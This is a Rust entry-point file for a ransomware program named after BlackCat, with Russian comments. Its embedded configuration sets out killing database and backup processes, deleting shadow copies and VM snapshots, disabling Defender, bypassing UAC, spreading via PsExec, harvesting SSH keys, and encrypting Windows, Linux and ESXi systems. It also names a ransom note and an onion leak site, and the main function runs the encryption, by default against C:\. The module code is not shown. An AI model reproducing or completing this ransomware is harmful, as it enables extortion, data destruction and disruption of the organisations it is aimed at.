mod config;
mod crypto;
mod windows;
mod linux;
mod esxi;
mod lateral_movement;
mod ransomware;

use config::BlackCatConfig;
use crypto::CryptoEngine;
use ransomware::BlackCatRansomware;
use std::env;

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    env_logger::init();
    
    // Парсим аргументы
    let args: Vec<String> = env::args().collect();
    
    // Проверяем access-token (анти-анализ)
    if args.len() < 2 || !args[1].starts_with("--access-token") {
        eprintln!("Error: Missing --access-token parameter");
        std::process::exit(1);
    }
    
    let access_token = &args[2];
    println!("[*] Access token provided: {}", access_token);
    
    // Загружаем встроенную конфигурацию (в реальном коде она была бы зашифрована)
    let config_json = r#"{
        "access_token": "YOUR_TOKEN_HERE",
        "rsa_public_key": "-----BEGIN PUBLIC KEY-----\nMIIBIjANB...",
        "encryption_extension": ".blackcat",
        "kill_processes": ["sql", "oracle", "backup"],
        "kill_services": ["MSSQLServer", "Oracle", "Veeam"],
        "exclude_directories": ["/windows", "/system32"],
        "exclude_extensions": ["exe", "dll", "sys"],
        "encryption_mode": "Fast",
        "fast_mode_mb": 100,
        "ransom_note_short": "Your files are encrypted",
        "ransom_note_full": "Visit our site for payment instructions",
        "leak_site_url": "http://onionsite.onion/",
        "credentials": {},
        "windows_options": {
            "enable_uac_bypass": true,
            "enable_shadow_copy_deletion": true,
            "enable_defender_disable": true,
            "enable_psexec_propagation": true,
            "psexec_targets": []
        },
        "linux_options": {
            "enable_ssh_key_harvesting": true,
            "enable_lateral_movement": true,
            "target_ssh_keys": [],
            "encrypt_all_users": true
        },
        "esxi_options": {
            "enable_vm_encryption": true,
            "enable_vm_termination": true,
            "enable_snapshot_deletion": true,
            "target_datastores": []
        }
    }"#;
    
    let config = BlackCatConfig::from_json(config_json)?;
    let crypto = CryptoEngine::new(&config.rsa_public_key, &config.encryption_mode)?;
    
    let ransomware = BlackCatRansomware::new(config, crypto);
    
    // Выполняем атаку на целевую директорию
    let target_path = if args.len() > 3 {
        &args[3]
    } else {
        "C:\\" // Windows по умолчанию
    };
    
    ransomware.execute(target_path).await?;
    
    println!("[+] Ransomware execution finished");
    Ok(())
}
